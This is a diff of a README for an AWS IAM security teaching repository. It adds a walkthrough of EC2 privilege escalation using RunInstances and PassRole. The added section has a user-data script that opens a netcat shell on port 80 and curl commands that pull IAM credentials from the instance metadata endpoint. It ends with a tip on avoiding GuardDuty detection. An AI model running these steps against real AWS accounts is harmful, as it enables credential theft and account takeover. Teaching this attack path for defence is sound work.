@@ -3,18 +3,21 @@
 This repository demonstrates common AWS IAM security vulnerabilities and privilege escalation techniques through hands-on examples. You will learn how seemingly harmless IAM configurations can lead to complete account compromise, and more importantly, how to prevent these security gaps
 
 ## Table of Contents
-1. [Users vs Roles vs User Groups](#1-users-vs-roles-vs-user-groups)
-   1. [User Groups](#11-user-groups)
-   2. [Users](#12-users)
-   3. [Roles](#13-roles)
-2. [Exploits](#2-exploits)
-   1. [IAM Privilege Escalation - sts::AssumeRole](#21-iam-privilege-escalation---stsassumerole)
-3. [Mitigations](#3-mitigations)
-   1. [AWS CloudTrail](#31-aws-cloudtrail)
-   2. [AWS Config](#32-aws-config)
-   3. [AWS GuardDuty](#33-aws-guardduty)
-      1. [Running Nmap for Ping Sweep](#331-running-nmap-for-ping-sweep)
-      2. [Unusual API Calls from unusual IP](#332-unusual-api-calls-from-unusual-ip)
+- [AWS IAM Security](#aws-iam-security)
+  - [Table of Contents](#table-of-contents)
+  - [1. Users vs Roles vs User Groups](#1-users-vs-roles-vs-user-groups)
+    - [1.1 User Groups](#11-user-groups)
+    - [1.2 Users](#12-users)
+    - [1.3 Roles](#13-roles)
+  - [2. Exploits](#2-exploits)
+    - [2.1 IAM Privilege Escalation - sts::AssumeRole](#21-iam-privilege-escalation---stsassumerole)
+    - [2.2 EC2 Privilege Escalation - ec2::RunInstances and iam::PassRole](#22-ec2-privilege-escalation---ec2runinstances-and-iampassrole)
+  - [3. Mitigations](#3-mitigations)
+    - [3.1 AWS CloudTrail](#31-aws-cloudtrail)
+    - [3.2 AWS Config](#32-aws-config)
+    - [3.3 AWS GuardDuty](#33-aws-guardduty)
+      - [3.3.1 Running Nmap for Ping Sweep](#331-running-nmap-for-ping-sweep)
+      - [3.3.2 Unusual API Calls from unusual IP](#332-unusual-api-calls-from-unusual-ip)
 
 ## 1. Users vs Roles vs User Groups
 
@@ -127,6 +130,47 @@ Click "Switch role" or if you have already have role registered, switch it [Refe
 
 ![iam service to AdminAccess](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_iam_role_privilege_escalation_self_assign_role_5.png)
 On the top-right, you can see we have successfully switched to "AdminAccess" role. You can now access CloudTrail as we got the administrative privilege.
+
+### 2.2 EC2 Privilege Escalation - ec2::RunInstances and iam::PassRole
+
+We will show how to escalate privilege using EC2 RunInstance and PassRole permission. This is a common attack vector where an attacker can launch an EC2 instance with a role that has more permissions than the user currently has.
+
+![create hacker user](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_credential_exfiltration_user.png)
+![hacker user permission](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_create_credential_exfiltration_user_perm.png)
+First, we will create a user called "hacker" with the ec2::RunInstance and iam::PassRole permission.
+
+Make a script called `malicious.sh` with the following content:
+
+```bash
+#!/bin/bash
+sudo busybox nc -lp 80 -e /bin/bash
+```
+
+> [!IMPORTANT]
+> You need to know the security group name that allows inbound traffic on port 80. In this case, we will use "Default Web" security group which allows inbound traffic on port 80.
+
+This script will open a reverse shell on port 80, allowing the attacker to connect to the instance.
+
+```bash
+aws ec2 run-instances --image-id <machine image or operating system used by the system> --instance-type t2.micro --iam-instance-profile Name=<IAM role for EC2> --user-data file://malicious.sh --security-groups "Default Web" --profile hacker
+```
+
+After running the above command, you will have a new EC2 instance running with the malicious script. The attacker can now get a reverse shell by connecting to the instance on port 80.
+
+![ec2 instance running reverse shell](https://github.com/daeisbae/aws-iam-security/blob/main/images/aws_exploit_credential_exfiltration_reverse_shell.png)
+Connect to port 80 of the EC2 instance to get a reverse shell. Then extract the credentials from the metadata endpoint using the command:
+
+```bash
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+# Get the role name
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Extract the credentials
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+```
+
+Using the credentials extracted from the metadata, the attacker can use the AWS API key in aws cli to be used for enumeration and exploit.
+
+However, the above method is not recommended as it can be [detected by AWS GuardDuty](#332-unusual-api-calls-from-unusual-ip). Instead, you can enumerate directly using the reverse shell or ssh into the instance.
 
 ## 3. Mitigations
 
